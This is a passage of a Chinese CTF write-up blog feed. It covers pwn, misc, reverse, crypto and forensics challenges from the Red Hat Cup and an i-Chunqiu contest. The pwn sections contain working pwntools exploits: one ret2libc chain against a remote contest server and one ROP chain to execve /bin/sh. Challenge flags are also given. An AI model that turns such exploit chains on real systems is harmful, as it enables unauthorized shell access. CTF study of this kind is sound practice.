class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">elf = ELF(&amp;<span class="comment">#039;./easy_pwn&amp;#039;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(&amp;<span class="comment">#039;./easy_pwn&amp;#039;)</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(&amp;quot;<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>&amp;quot;,&amp;quot;<span class="number">10025</span>&amp;quot;)</span><br><span class="line">libc = ELF(&amp;<span class="comment">#039;./libc6-i386_2.23.so&amp;#039;)</span></span><br><span class="line">main = <span class="number">0x80492F5</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露 libc 地址</span></span><br><span class="line">ru(&amp;quot;name!\n&amp;quot;)</span><br><span class="line">pay = &amp;<span class="comment">#039;I&amp;#039;*0x10 </span></span><br><span class="line">pay += p32(elf.plt[&amp;<span class="comment">#039;puts&amp;#039;]) + p32(main) + p32(elf.got[&amp;#039;puts&amp;#039;])</span></span><br><span class="line"><span class="comment"># gdb.attach(p,&amp;quot;b *0x80490CB&amp;quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算函数 system 和字符串 /bin/sh 的地址</span></span><br><span class="line">sl(pay)</span><br><span class="line">ru(&amp;<span class="comment">#039;\n&amp;#039;)</span></span><br><span class="line">puts_addr = u32(rc(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[&amp;<span class="comment">#039;puts&amp;#039;]</span></span><br><span class="line">system = libc_base + libc.symbols[&amp;<span class="comment">#039;system&amp;#039;]</span></span><br><span class="line">binsh = libc_base + libc.search(&amp;quot;/<span class="built_in">bin</span>/sh\x00&amp;quot;).<span class="built_in">next</span>()</span><br><span class="line">log.warn(&amp;quot;puts_addr --&amp;gt; %s&amp;quot;,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">log.warn(&amp;quot;system --&amp;gt; %s&amp;quot;,<span class="built_in">hex</span>(system))</span><br><span class="line">log.warn(&amp;quot;binsh --&amp;gt; %s&amp;quot;,<span class="built_in">hex</span>(binsh))</span><br><span class="line">log.warn(&amp;quot;libc_base --&amp;gt; %s&amp;quot;,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ru(&amp;quot;name!\n&amp;quot;)</span><br><span class="line">pay = &amp;<span class="comment">#039;I&amp;#039;*0x10</span></span><br><span class="line">pay += p32(system) + p32(main) + p32(binsh)</span><br><span class="line"><span class="comment"># gdb.attach(p,&amp;quot;b *0x80490CB&amp;quot;)</span></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三届红帽杯线上赛Writeup</title>
      <link href="archives/618c9d36/"/>
      <url>archives/618c9d36/</url>
      
        <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="three"><a href="#three" class="headerlink" title="three"></a>three</h3><p>IDA打开之后，函数名都是<code>sub_xxx</code>，然后通过nc官方部署的程序（或本地在程序所在目录创建flag文件后），获得程序中会出现的字符串定位到了重要函数，我用的是字符串<code>Maybe is good</code>。</p><p>贴出来一下重要函数对应的内存地址：</p><table><thead><tr><th>函数名（已重命名）</th><th>内存地址</th></tr></thead><tbody><tr><td>main</td><td>0x08048CA8</td></tr><tr><td>load_flag</td><td>0x080488C5</td></tr><tr><td>Maybe_is_good</td><td>0x0804897E</td></tr><tr><td>main_method</td><td>0x08048B5C</td></tr></tbody></table><p>四者结构如图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191112231835.png" alt="四者结构"></p><p><code>load_flag</code>里面需要加载flag文件，如果没有就exit，也就是一开始无法本地打开原因。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191112232013.png"></p><p>Maybe_is_good 里面没有特别的，关键在main_method，先贴出完整代码（以重名部分函数&amp;注释）</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191112232152.png"></p><p>gdb调试：’very much’ 后输入 ‘aaa’，’tell me’ 后输入 ‘bbbbbbbbbbb······’。可以看到eax被写入了’aaa’，ecx被写入了’bbbbbbbbbbbbbbbbbbb····’</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191112232844.png"></p><p>然后就是第22行代码，看不懂就查汇编，对应的汇编是<code>call eax</code>。就是当eax是函数来调用。结合前面的eax会被覆写为输入值，就可以进行<strong>ROP</strong>。</p><p>攻击大致流程如下：</p><ol><li>eax被覆写为payload1</li><li>写入payload2</li><li>call eax</li><li>int80_call</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">elf = ELF(&amp;<span class="comment">#039;./pwn&amp;#039;)</span></span><br><span class="line"><span class="comment"># &amp;#039;ldd ./pwn&amp;#039; get libc.so</span></span><br><span class="line"><span class="comment"># libc = ELF(&amp;#039;./libc-2.27.so&amp;#039;)</span></span><br><span class="line">libc = ELF(&amp;<span class="comment">#039;/lib/x86_64-linux-gnu/libc.so.6&amp;#039;)</span></span><br><span class="line"></span><br><span class="line">sh = process(&amp;<span class="comment">#039;./pwn&amp;#039;)</span></span><br><span class="line">sh.sendlineafter(&amp;<span class="comment">#039;index:\n&amp;#039;, str(0)) # 0&amp;lt;=x&amp;lt;=31</span></span><br><span class="line"></span><br><span class="line">payload = asm(&amp;<span class="comment">#039;&amp;#039;&amp;#039;</span></span><br><span class="line">xchg ecx, esp</span><br><span class="line">ret</span><br><span class="line">&amp;<span class="comment">#039;&amp;#039;&amp;#039;,arch = &amp;#039;i386&amp;#039;)</span></span><br><span class="line">sh.sendafter(&amp;<span class="comment">#039; much!\n&amp;#039;, payload)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&amp;<span class="comment">#039;size:\n&amp;#039;, str(512)) # 0&amp;lt;=x&amp;lt;=512,x&amp;gt;payload</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">layout = [</span><br><span class="line">    <span class="number">0x08072fb1</span>, <span class="comment">#: pop edx; pop ecx; pop ebx; ret; </span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x80f6d40</span>, <span class="comment"># &amp;#039;/bin/sh\0&amp;#039; address</span></span><br><span class="line">    <span class="number">0x080c11e6</span>, <span class="comment">#: pop eax; ret; </span></span><br><span class="line">    <span class="number">11</span>, <span class="comment"># len &amp;#039;/bin/sh\0&amp;#039;</span></span><br><span class="line">    <span class="number">0x080738c0</span>, <span class="comment">#: int 0x80; ret; </span></span><br><span class="line">]</span><br><span class="line">sh.sendafter(&amp;<span class="comment">#039;me:\n&amp;#039;, flat(layout).ljust(0x80, &amp;#039;\0&amp;#039;) + &amp;#039;/bin/sh\0&amp;#039;)</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong>EXP解释</strong></p><ul><li>13、21行两个数值可在注释范围内调整</li><li>payload是交换ecx、esp两个寄存器的值</li><li>layout里面是gadget，向int_80传参</li><li>int_80的作用类似于system，具体看这里<ul><li><a href="https://blog.csdn.net/fivedoumi/article/details/53184797">https://blog.csdn.net/fivedoumi/article/details/53184797</a></li><li><a href="https://blog.csdn.net/maowenl/article/details/32309683">https://blog.csdn.net/maowenl/article/details/32309683</a></li><li><a href="https://www.cnblogs.com/caesarxu/p/3261232.html">https://www.cnblogs.com/caesarxu/p/3261232.html</a></li></ul></li></ul><p>最后：官方wp解法是交换ecx、esp的内容之后，利用返回值是<code>1</code>还是<code>2</code>，来逐个字节爆破得出flag。</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Advertising-for-Marriage"><a href="#Advertising-for-Marriage" class="headerlink" title="Advertising for Marriage"></a>Advertising for Marriage</h3><p>内存取证题目。题目给出的是raw文件，这个文件不是图片的那个raw。。。初次之外内存取证还有<strong>dmg</strong>文件。利用的分析工具最主要是<code>volatility</code>。</p><p>首先查看镜像信息：<code>volatility -f Advertising\ for\ Marriage.raw imageinfo</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191115194954.png"></p><p>使用 <code>WinXPSP2x86</code> 预设。然后就是查进程：<code>volatility -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86 pslist</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191115195158.png"></p><p>存在记事本进程，查一查有什么：<code>volatility -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86 notepad</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191115195319.png"></p><p>提示：<code>hint:????needmoneyandgirlfirend</code></p><p>扫描所有png文件：<code>volatility  -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86 filescan|grep png</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191115195554.png"></p><p>找到一张 <code>png</code> 图片：<code>vegetable.png</code>。导出图片：<code>volatility  -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86 dumpfiles -D . -Q 0x000000000249ae78</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191115195756.png"></p><p>图片无法显示，报错：<code>IHDR: CRC ERROR</code>。</p><p>估计图片尺寸被修改了。</p><p>用脚本计算图片实际长度和宽度，并且生成修复后的图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">img = <span class="built_in">open</span>(&amp;quot;vegetable.png&amp;quot;, &amp;quot;rb&amp;quot;).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">        data = img[<span class="number">0xc</span>:<span class="number">0x10</span>] + struct.pack(&amp;<span class="comment">#039;&amp;gt;i&amp;#039;,w) + struct.pack(&amp;#039;&amp;gt;i&amp;#039;,h) + img[0x18:0x1d]</span></span><br><span class="line">        crc32 = binascii.crc32(data) &amp;amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32 == struct.unpack(&amp;<span class="comment">#039;&amp;gt;i&amp;#039;,img[0x1d:0x21])[0] &amp;amp; 0xffffffff:</span></span><br><span class="line">            <span class="built_in">print</span> w, h</span><br><span class="line">            <span class="built_in">print</span> <span class="built_in">hex</span>(w), <span class="built_in">hex</span>(h)</span><br><span class="line">            <span class="built_in">open</span>(&amp;quot;vegetable_new.png&amp;quot;, &amp;quot;wb&amp;quot;).write(img[:<span class="number">0xc</span>] + data + img[<span class="number">0x1d</span>:])</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>用 <code>Stegsolve</code> 查看图片，找到模糊的 <code>flag</code>，一般情况较难恢复。同时，也发现 <code>lsb</code> 有点东西。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191116000941.png"></p><p>解密需要密钥，密钥为上面记事本找到的提示：<code>????needmoneyandgirlfirend</code>，需要魔改工具爆破前 4 字节。</p><p>爆破得到密钥 <code>b1cxneedmoneyandgirlfirend</code>，这里给出自己写的破解脚本，需要把<code>lsb加密库</code>clone <a href="https://github.com/livz/cloacked-pixel">下载</a>，然后把脚本丢里面运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># creat password</span></span><br><span class="line">password = []</span><br><span class="line">pd_element =  <span class="built_in">list</span>(string.ascii_letters) + <span class="built_in">list</span>(string.digits)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pd_element:</span><br><span class="line"><span class="keyword">if</span> i != &amp;<span class="comment">#039;b&amp;#039;:</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> pd_element:</span><br><span class="line"><span class="comment">#if j != &amp;#039;1&amp;#039;:</span></span><br><span class="line"><span class="comment">#continue</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> pd_element:</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> pd_element:</span><br><span class="line">password.append(i+j+k+m+&amp;quot;needmoneyandgirlfirend&amp;quot;)</span><br><span class="line"><span class="comment">#pd = i+j+k+m+&amp;quot;needmoneyandgirlfirend&amp;quot;</span></span><br><span class="line"><span class="comment">#print &amp;quot;password = %s &amp;quot; %pd</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">file_name = &amp;<span class="comment">#039;2.png&amp;#039; # 解密的图片</span></span><br><span class="line">out_file_1 = &amp;<span class="comment">#039;out.txt&amp;#039; # lsb中间文件</span></span><br><span class="line">out_file_2 = &amp;<span class="comment">#039;result.txt&amp;#039; # result结果记录文件</span></span><br><span class="line"><span class="keyword">for</span> pd <span class="keyword">in</span> password:</span><br><span class="line">out_data_2= <span class="built_in">open</span>(out_file_2,&amp;<span class="comment">#039;a&amp;#039;)</span></span><br><span class="line">pd = &amp;<span class="comment">#039;b1cxneedmoneyandgirlfirend&amp;#039;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span> &amp;quot;total <span class="keyword">try</span> &#123;&#125; times\ntrying: &#123;&#125;&amp;quot;.<span class="built_in">format</span>(n,pd)</span><br><span class="line">argv = r&amp;<span class="comment">#039;python lsb.py extract &amp;#039; + file_name  + &amp;#039; &amp;#039; + out_file_1 + &amp;#039; &amp;#039;+ pd </span></span><br><span class="line">lsb  =  os.popen(argv,&amp;<span class="comment">#039;r&amp;#039;)</span></span><br><span class="line">data = lsb.read()</span><br><span class="line">lsb.close()</span><br><span class="line"><span class="built_in">print</span> &amp;quot;&#123;&#125; SUCCESS&amp;quot;.<span class="built_in">format</span>(pd)</span><br><span class="line">out_data_1 = <span class="built_in">open</span>(out_file_1,&amp;<span class="comment">#039;r&amp;#039;)</span></span><br><span class="line">data = out_data_1.read().strip(&amp;<span class="comment">#039;\n&amp;#039;)</span></span><br><span class="line">out_data_2.write(data+&amp;<span class="comment">#039;\n&amp;#039;)</span></span><br><span class="line">n += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span> &amp;quot;&#123;&#125; ERROR&amp;quot;.<span class="built_in">format</span>(pd)</span><br><span class="line">n += <span class="number">1</span></span><br><span class="line">out_data_2.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解密图片隐写信息，得到字符串：<code>VmlyZ2luaWEgY2lwaGVydGV4dDpnbnh0bXdnN3IxNDE3cHNlZGJzNjI1ODdoMA==</code>。</p><p><code>base64</code> 解码得到：<code>Virginia ciphertext:gnxtmwg7r1417psedbs62587h0</code>。</p><p>然后再使用在线维吉尼亚密码解密：密钥<code>b1cxneedmoneyandgirlfirend</code></p><p>解密得到： <code>flagisd7f1417bfafbf62587e0</code>。</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 红帽杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋CTF答题赛（第三季）WriteUp</title>
      <link href="archives/e0b3d41f/"/>
      <url>archives/e0b3d41f/</url>
      
        <content type="html"><![CDATA[<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="幸运数字"><a href="#幸运数字" class="headerlink" title="幸运数字"></a>幸运数字</h3><p>分析 main 函数得出，只要输入的值经过加密转换之后等于<code>H5wg_2g_MCif_T1ou_v7v7v</code>，就会返回真正 flag 。加密算法只针对字符串中的英文字符。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191129124503.png"></p><p>分析中间加密部分可知，如果密文是大写字母，那么明文也是大写字母；小写字母同理。如果想检验的下面给出加密部分的 c 源码，自己加一个循环上去，看看就知道了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;stdio.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;cstring&amp;gt;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a_list[]= &amp;quot;N5cm_2m_SIol_Z1ua_b7b7b&amp;quot;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v5=<span class="built_in">strlen</span>(a_list)+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> v8;</span><br><span class="line"><span class="keyword">char</span> v9;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&amp;lt;=v5<span class="number">-2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line">v8 = a_list[i];</span><br><span class="line"><span class="keyword">if</span>(v8&amp;gt;&amp;#<span class="number">039</span>;Z&amp;#<span class="number">039</span>;||v8&amp;lt;&amp;#<span class="number">039</span>;A&amp;#<span class="number">039</span>;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(v8&amp;gt;&amp;#<span class="number">039</span>;z&amp;#<span class="number">039</span>;||v8&amp;lt;&amp;#<span class="number">039</span>;a&amp;#<span class="number">039</span>;)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">v9 = (v8 - <span class="number">83</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">v9 = (v8 - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line"> &#125; </span><br><span class="line">a_list[i] = v9;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(&amp;quot;%s&amp;quot;,a_list);</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p>反正明文组合也不多，就爆破之。最终 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">a = &amp;quot;H5wg_2g_MCif_T1ou_v7v7v&amp;quot;</span><br><span class="line">b = &amp;quot;&amp;quot;</span><br><span class="line">ascii_lowercase = string.ascii_lowercase</span><br><span class="line">ascii_uppercase = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> a:</span><br><span class="line">log = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> letter <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line"><span class="keyword">for</span> upper <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">c_upper = (<span class="built_in">ord</span>(upper)-<span class="number">51</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">chr</span>(c_upper) == letter:</span><br><span class="line">b += upper</span><br><span class="line">log = <span class="number">1</span></span><br><span class="line">print(&amp;quot;[+]&#123;&#125; <span class="keyword">is</span> find --&amp;gt; &#123;&#125;&amp;quot;.<span class="built_in">format</span>(letter,upper))</span><br><span class="line"><span class="keyword">if</span> letter <span class="keyword">in</span> ascii_lowercase:</span><br><span class="line"><span class="keyword">for</span> lower <span class="keyword">in</span> ascii_lowercase:</span><br><span class="line">c_lower = (<span class="built_in">ord</span>(lower)-<span class="number">83</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">chr</span>(c_lower) == letter:</span><br><span class="line">b += lower</span><br><span class="line">log = <span class="number">1</span></span><br><span class="line">print(&amp;quot;[+]&#123;&#125; <span class="keyword">is</span> find --&amp;gt; &#123;&#125;&amp;quot;.<span class="built_in">format</span>(letter,lower))</span><br><span class="line"><span class="keyword">if</span> log == <span class="number">0</span>:</span><br><span class="line">b += letter</span><br><span class="line">print(&amp;quot;[+]&#123;&#125; <span class="keyword">is</span> find.&amp;quot;.<span class="built_in">format</span>(letter))</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>flag{T5is_2s_YOur_F1ag_h7h7h}</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="word"><a href="#word" class="headerlink" title="word"></a>word</h3><p>密码：cq19</p><p><strong>白给</strong></p><h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><p>flag{obol0dxf-adtr-1vft-p7ng-djulcfsbil3y}</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="md5-brute"><a href="#md5-brute" class="headerlink" title="md5_brute"></a>md5_brute</h3><p>将4个 md5 拿去解密得到flag。</p><p><a href="https://www.cmd5.com/">在线md5解密</a></p><h4 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h4><p>flag{wangwu-2019-1111-9527}</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><p>差分曼彻斯特编码 + 十六进制转字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msg1 = <span class="number">0x9a9a9a6a9aa9656699a699a566995956996a996aa6a965aa9a6aa596a699665a9aa699655a696569655a9a9a9a595a6965569a59665566955a6965a9596a99aa9a9566a699aa9a969969669aa6969a9559596669</span></span><br><span class="line">s = <span class="built_in">bin</span>(msg1)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span> s</span><br><span class="line">r = &amp;quot;&amp;quot;</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(s) / <span class="number">2</span>):</span><br><span class="line">    c = s[i * <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> c == s[i * <span class="number">2</span> - <span class="number">1</span>]:</span><br><span class="line">        r += &amp;<span class="comment">#039;1&amp;#039;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r += &amp;<span class="comment">#039;0&amp;#039;</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(<span class="built_in">int</span>(r, <span class="number">2</span>))[<span class="number">2</span>:-<span class="number">1</span>].decode(&amp;<span class="comment">#039;hex&amp;#039;)</span></span><br></pre></td></tr></table></figure><h4 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h4><p>flag{zw1tt1hl-7zcv-ebfk-akxt-i4xdsxeuv5d3}</p><h3 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a>encrypt</h3><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191201204636.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191201204704.png"></p><h4 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h4><p>flag{Easy!eAsy!eaSy!}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Electrical-System"><a href="#Electrical-System" class="headerlink" title="Electrical System"></a>Electrical System</h3><p>64位，仅有 NX 保护的程序。通过 IDA 分析，在菜单选择列表中，存在着栈溢出的漏洞。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191201200724.png"></p><p>分析源码得出，在输入 ID 时，数据(&amp;buf)将会保存到 .bss 